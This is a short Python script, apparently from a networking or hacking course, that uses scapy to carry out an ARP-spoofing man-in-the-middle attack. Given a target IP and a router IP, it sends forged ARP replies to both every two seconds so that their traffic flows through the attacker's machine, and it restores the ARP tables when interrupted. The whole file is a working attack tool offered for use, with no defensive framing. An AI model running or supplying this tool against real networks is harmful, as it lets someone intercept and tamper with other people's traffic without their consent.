#!/usr/bin/env/ python

import scapy.all as scapy
import time
import sys
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP.")
    parser.add_option("-r", "--router", dest="router", help="Router IP.")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target, use --help for more info.")
    elif not options.router:
        parser.error("[-] Please specify a router, use --help for more info.")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    final_request = broadcast / arp_request
    answers = scapy.srp(final_request, timeout=1, verbose=False)[0]
    if len(answers) == 0:
        sys.exit("[-] ERROR: " + ip + " is not in the network.")
    return answers[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # op=2 says that we are creating a response, not a request
    # pdst specifies the IP of the target
    # hwst specifies the MAC address of the target
    # psrc specifies de source (in this case I put the router IP instead of mine)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    dest_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
target_ip = options.target
router_ip = options.router

try:
    sent_packets = 0
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        sent_packets += 2
        print("\r[+] Sent " + str(sent_packets) + " packets."),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C, resetting ARP tables.")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
